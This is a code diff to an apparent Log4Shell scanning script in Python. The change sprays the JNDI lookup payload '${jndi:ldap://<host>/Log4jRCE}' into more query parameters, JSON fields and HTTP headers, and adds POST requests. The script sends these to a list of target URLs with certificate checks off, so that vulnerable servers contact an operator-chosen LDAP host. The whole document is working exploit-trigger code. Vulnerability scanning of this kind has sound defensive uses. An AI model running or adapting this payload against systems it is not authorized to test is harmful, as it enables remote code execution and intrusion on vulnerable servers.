@@ -1,5 +1,5 @@
 from sys import argv
-from requests import get
+from requests import get,post
 from urllib3 import disable_warnings
 from concurrent.futures import ThreadPoolExecutor
 
@@ -11,11 +11,27 @@ proxies = {}
 def sendDetectionRequest(url, urlId):
     try:
         payload = '${jndi:ldap://' +  argv[2] + '/Log4jRCE}'
-        params = {'id':payload}
-        headers = {'User-Agent':payload, 'Referer':payload}
+        params = {
+            'id':payload,
+            'user':payload,
+            'username':payload,
+            'email':payload,
+            'password':payload,
+        }
+        headers = {
+            'User-Agent':payload, 
+            'Referer':payload, 
+            'Origin':payload,
+            'Cookie':payload,
+            'Accept-Datetime':payload,
+            'Accept-Encoding':payload,
+            'Accept-Language':payload,
+        }
         url = url.strip()
         print('[{}] Testing {}'.format(urlId, url))
         get(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
+        post(url, headers=headers, params=params, verify=False, proxies=proxies, timeout=10)
+        post(url, headers=headers, json=params, verify=False, proxies=proxies, timeout=10)
     except Exception as e:
         print('Exception on urlId={}, url={}:'.format(urlId, url))
         print(e)
